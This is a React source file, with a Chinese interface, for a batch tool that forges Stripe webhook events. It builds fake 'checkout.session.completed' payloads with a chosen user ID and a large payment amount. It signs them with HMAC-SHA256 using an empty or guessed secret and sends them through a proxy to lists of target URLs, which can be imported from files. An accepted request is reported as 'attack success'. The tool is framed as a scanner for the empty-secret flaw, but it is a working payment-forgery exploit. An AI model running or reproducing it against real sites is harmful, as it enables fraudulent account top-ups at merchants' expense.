import React, { useState } from 'react';
import { Terminal, ShieldAlert, Zap, Code, Activity, CheckCircle, XCircle, Globe, List, Upload } from 'lucide-react';
import CryptoJS from 'crypto-js';
import clsx from 'clsx';

interface LogEntry {
  time: string;
  type: 'info' | 'success' | 'error' | 'request' | 'response' | 'warning';
  message: string;
  details?: any;
}

function App() {
  const [urlsText, setUrlsText] = useState('http://localhost:8080/api/stripe/webhook\nhttp://localhost:8081/api/stripe/webhook\nhttps://api.example.com/stripe/webhook');
  const [clientId, setClientId] = useState('USR-9999-HACK-123456');
  const [amount, setAmount] = useState(9999);
  const [secret, setSecret] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [isHacking, setIsHacking] = useState(false);

  const addLog = (type: LogEntry['type'], message: string, details?: any) => {
    setLogs(prev => [...prev, {
      time: new Date().toLocaleTimeString(),
      type,
      message,
      details
    }]);
  };

  const forgeSignature = (payloadStr: string, secretKey: string, timestamp: string) => {
    const signedPayload = `${timestamp}.${payloadStr}`;
    const hash = CryptoJS.HmacSHA256(signedPayload, secretKey);
    const v1 = hash.toString(CryptoJS.enc.Hex);
    return `t=${timestamp},v1=${v1}`;
  };

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const executeAttack = async () => {
    const urls = urlsText.split('\n').map(u => u.trim()).filter(u => u);

    if (urls.length === 0) {
      addLog('error', '请输入至少一个目标 Webhook URL (需以 http:// 或 https:// 开头)');
      return;
    }

    setIsHacking(true);
    setLogs([]); // Clear previous logs
    addLog('info', `=== 开始批量探测任务，共 ${urls.length} 个目标 ===`);

    for (let i = 0; i < urls.length; i++) {
      const currentUrl = urls[i];
      
      if (!currentUrl.startsWith('http')) {
        addLog('error', `[${i + 1}/${urls.length}] 跳过无效 URL: ${currentUrl}`);
        continue;
      }

      addLog('info', `\n▶ [${i + 1}/${urls.length}] 正在探测目标: ${currentUrl}`);
      
      // Generate unique payload per request to avoid caching issues
      const payload = {
        id: "evt_test_forgery_" + Math.random().toString(36).substring(7),
        type: "checkout.session.completed",
        data: {
          object: {
            id: "cs_test_hacked_" + Math.random().toString(36).substring(7),
            client_reference_id: clientId,
            status: "complete",
            payment_status: "paid",
            amount_total: amount * 100 // Stripe expects cents
          }
        }
      };

      const jsonBody = JSON.stringify(payload);
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const signature = forgeSignature(jsonBody, secret, timestamp);

      const fetchUrl = '/api/proxy';
      const extraHeaders: Record<string, string> = {
        'X-Target-Url': currentUrl
      };
      
      addLog('request', `POST ${currentUrl} (Signature: ${signature.substring(0, 20)}...)`);

      try {
        const response = await fetch(fetchUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Stripe-Signature': signature,
            ...extraHeaders
          },
          body: jsonBody
        });

        const responseText = await response.text();
        
        addLog('response', `服务端响应状态码: ${response.status} ${response.statusText}`, responseText);

        if (response.ok) {
          addLog('success', `🎉 目标 [${currentUrl}] 攻击成功！可能存在空密钥漏洞。`);
        } else {
          addLog('error', `❌ 目标 [${currentUrl}] 攻击失败，服务端拒绝了伪造请求。`);
        }
      } catch (error: any) {
        addLog('warning', `网络请求失败: ${error.message} (目标可能不可达)`);
      }

      // Add a small delay between requests to not overwhelm the proxy or browser
      if (i < urls.length - 1) {
        await delay(1000);
      }
    }

    addLog('info', `\n=== 批量探测任务执行完毕 ===`);
    setIsHacking(false);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-300 font-sans selection:bg-emerald-500/30 pb-10">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="p-1.5 sm:p-2 bg-indigo-500/10 rounded-lg shrink-0 border border-indigo-500/20">
              <Globe className="w-5 h-5 sm:w-6 sm:h-6 text-indigo-400" />
            </div>
            <div className="min-w-0">
              <h1 className="font-bold text-slate-100 text-sm sm:text-base truncate">Stripe Webhook 批量探测器</h1>
              <p className="text-[10px] sm:text-xs text-slate-500 truncate">专用于批量测试目标站点的签名漏洞</p>
            </div>
          </div>
          <div className="flex items-center shrink-0 ml-2">
            <span className="flex items-center gap-1.5 sm:gap-2 text-[10px] sm:text-xs font-medium px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">
              <Activity className="w-3 h-3 sm:w-4 sm:h-4 text-emerald-500" />
              <span className="hidden sm:inline">系统就绪</span>
              <span className="sm:hidden">就绪</span>
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8 grid lg:grid-cols-12 gap-6 sm:gap-8">
        
        {/* Left Column: Controls & Flow */}
        <div className="lg:col-span-4 space-y-6">
          
          {/* Attack Configuration */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col h-full max-h-[800px]">
            <div className="px-4 sm:px-5 py-3 sm:py-4 border-b border-slate-800 flex items-center gap-2 shrink-0">
              <List className="w-4 h-4 sm:w-5 sm:h-5 text-amber-500" />
              <h2 className="font-semibold text-slate-100 text-sm sm:text-base">批量探测参数配置</h2>
            </div>
            
            <div className="p-4 sm:p-5 space-y-4 sm:space-y-5 overflow-y-auto scrollbar-thin scrollbar-thumb-slate-700">
              {/* Custom URLs Input */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] sm:text-xs font-semibold text-indigo-400 uppercase tracking-wider flex items-center gap-1">
                    <Globe className="w-3 h-3" /> 目标 Webhook URLs (每行一个)
                  </label>
                  <label className="cursor-pointer flex items-center gap-1 text-[10px] sm:text-[11px] bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 px-2 py-1 rounded border border-indigo-500/30 transition-colors">
                    <Upload className="w-3 h-3" /> 导入本地文件
                    <input 
                      type="file" 
                      accept=".txt,.csv" 
                      className="hidden" 
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (!file) return;
                        const reader = new FileReader();
                        reader.onload = (event) => {
                          const content = event.target?.result;
                          if (typeof content === 'string') {
                            let parsedUrls = content;
                            
                            // 针对 CSV 文件进行特殊处理：提取所有包含 http 的单元格
                            if (file.name.toLowerCase().endsWith('.csv')) {
                              const lines = content.split(/\r?\n/);
                              const extractedUrls: string[] = [];
                              
                              lines.forEach(line => {
                                // 简单的 CSV 分割，忽略引号内的逗号问题，仅作快速提取 URL 用
                                const cells = line.split(',');
                                cells.forEach(cell => {
                                  const trimmedCell = cell.trim().replace(/^"|"$/g, ''); // 去除可能存在的引号
                                  if (trimmedCell.startsWith('http://') || trimmedCell.startsWith('https://')) {
                                    extractedUrls.push(trimmedCell);
                                  }
                                });
                              });
                              
                              if (extractedUrls.length > 0) {
                                parsedUrls = extractedUrls.join('\n');
                                addLog('info', `✅ 成功解析 CSV 文件: ${file.name}，提取出 ${extractedUrls.length} 个有效 URL。`);
                              } else {
                                addLog('warning', `⚠️ 在 CSV 文件 ${file.name} 中未找到任何以 http/https 开头的 URL，已加载原始内容。`);
                              }
                            } else {
                               addLog('info', `✅ 成功读取本地文本文件: ${file.name}。`);
                            }

                            setUrlsText(parsedUrls);
                          }
                        };
                        reader.readAsText(file);
                        e.target.value = ''; // Reset input to allow reading the same file again
                      }} 
                    />
                  </label>
                </div>
                <textarea
                  value={urlsText}
                  onChange={(e) => setUrlsText(e.target.value)}
                  placeholder="http://localhost:8080/api/stripe/webhook&#10;https://api.example.com/stripe/webhook"
                  className="w-full bg-indigo-950/20 border border-indigo-500/30 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-indigo-200 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-indigo-800/50 font-mono min-h-[120px] resize-y"
                />
              </div>

              {/* Secret Key */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">签名密钥 (Secret)</label>
                <input
                  type="text"
                  value={secret}
                  onChange={(e) => setSecret(e.target.value)}
                  placeholder="留空以测试空密钥漏洞"
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-slate-600 font-mono"
                />
                <p className="text-[10px] sm:text-[11px] text-slate-500 leading-tight">如果目标存在配置缺陷，使用空密钥生成的签名将绕过验证。</p>
              </div>

              {/* Client ID */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">伪造用户 ID</label>
                <input
                  type="text"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                />
              </div>

              {/* Amount */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">伪造充值金额</label>
                <div className="relative">
                  <span className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 font-mono">$</span>
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(Number(e.target.value))}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg pl-7 sm:pl-8 pr-3 sm:pr-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                  />
                </div>
              </div>

              {/* Action */}
              <button
                onClick={executeAttack}
                disabled={isHacking}
                className="w-full relative group overflow-hidden rounded-lg mt-2 sm:mt-4 disabled:opacity-70 disabled:cursor-not-allowed active:scale-[0.98] transition-transform touch-manipulation shrink-0"
              >
                <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-indigo-600 to-blue-600 opacity-80 group-hover:opacity-100 transition-opacity"></div>
                <div className="relative px-4 sm:px-6 py-3 sm:py-3.5 flex items-center justify-center gap-2 text-white font-bold tracking-wide text-sm sm:text-base">
                  {isHacking ? (
                    <span className="flex items-center gap-2">
                      <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      正在批量探测...
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">
                      <Zap className="w-4 h-4 sm:w-5 sm:h-5" />
                      开始批量探测
                    </span>
                  )}
                </div>
              </button>
            </div>
          </section>

          {/* Explainer */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg p-4 sm:p-5 hidden lg:block">
            <h3 className="text-sm font-semibold text-slate-300 mb-4 flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-indigo-400" />
              探测原理说明
            </h3>
            <div className="space-y-4">
              <p className="text-xs text-slate-400 leading-relaxed">
                本工具用于批量测试目标站点的 Stripe Webhook 接口是否存在**“空密钥签名伪造”**漏洞。
              </p>
              <ul className="space-y-2 text-xs text-slate-400 list-disc pl-4">
                <li>前端会逐一解析您输入的 URL 列表。</li>
                <li>为每个目标生成独一无二的伪造请求和 HMAC-SHA256 签名。</li>
                <li>通过本地代理逐个发送请求（请求之间有 1 秒延迟防止拥塞），并实时反馈结果。</li>
              </ul>
            </div>
          </section>
        </div>

        {/* Right Column: Terminal */}
        <div className="lg:col-span-8 flex flex-col h-[600px] lg:h-[800px]">
          <section className="flex-1 bg-[#0a0a0a] border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col font-mono text-xs sm:text-sm relative">
            
            {/* Terminal Header */}
            <div className="px-3 sm:px-4 py-2.5 sm:py-3 bg-slate-900 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-slate-500" />
                <span className="text-slate-400 text-[10px] sm:text-xs tracking-wider">批量探测终端 // STDOUT</span>
              </div>
              <div className="flex gap-1.5">
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-rose-500/20 border border-rose-500/50"></div>
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-amber-500/20 border border-amber-500/50"></div>
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50"></div>
              </div>
            </div>

            {/* Terminal Output */}
            <div className="flex-1 p-3 sm:p-5 overflow-y-auto space-y-3 scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent pb-10">
              {logs.length === 0 ? (
                <div className="text-slate-600 flex items-center gap-2 h-full justify-center">
                  <Terminal className="w-4 h-4 sm:w-5 sm:h-5 opacity-50" />
                  等待输入目标 URL 列表并执行...
                </div>
              ) : (
                logs.map((log, index) => (
                  <div key={index} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
                    <div className="flex items-start gap-2 sm:gap-3">
                      <span className="text-slate-600 shrink-0 select-none text-[10px] sm:text-xs pt-0.5 sm:pt-0">[{log.time}]</span>
                      <div className="flex-1 overflow-hidden">
                        
                        {/* Log Message */}
                        <span className={clsx(
                          "whitespace-pre-wrap break-words",
                          log.type === 'info' && "text-blue-400",
                          log.type === 'success' && "text-emerald-400 font-bold",
                          log.type === 'error' && "text-rose-400 font-bold",
                          log.type === 'warning' && "text-amber-500 font-semibold",
                          log.type === 'request' && "text-amber-400",
                          log.type === 'response' && "text-purple-400"
                        )}>
                          {log.type === 'success' && <CheckCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'error' && <XCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'warning' && <ShieldAlert className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.message}
                        </span>

                        {/* Details JSON */}
                        {log.details && (
                          <div className="mt-1.5 sm:mt-2 bg-black/50 p-2 sm:p-3 rounded border border-slate-800/50 overflow-x-auto text-[10px] sm:text-xs text-slate-300">
                            {typeof log.details === 'string' ? (
                              <pre>{log.details}</pre>
                            ) : (
                              <pre>{JSON.stringify(log.details, null, 2)}</pre>
                            )}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ))
              )}
              {isHacking && (
                <div className="flex items-center gap-2 text-slate-500 animate-pulse mt-2">
                  <span className="w-1.5 h-3 sm:w-2 sm:h-4 bg-slate-500 block"></span>
                </div>
              )}
            </div>
          </section>
        </div>

      </main>
    </div>
  );
}

export default App;
